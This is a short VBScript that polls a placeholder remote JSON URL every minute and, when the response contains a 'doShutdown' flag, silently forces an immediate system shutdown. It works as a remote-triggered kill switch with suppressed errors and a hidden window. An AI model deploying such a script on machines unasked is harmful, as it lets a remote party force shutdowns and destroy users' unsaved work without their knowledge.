Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
Set objShell = CreateObject("WScript.Shell")

WScript.Sleep 60000

Do
    On Error Resume Next
    
    objXMLHTTP.Open "GET", "YOUR-NPOINT-API-URL", False
    objXMLHTTP.Send

    If objXMLHTTP.Status = 200 Then
        response = objXMLHTTP.responseText
        
        If InStr(response, """doShutdown"":true") > 0 Then
            objShell.Run "shutdown -s -f -t 0", 0, False
            Exit Do
        End If
    End If

    WScript.Sleep 60000
Loop
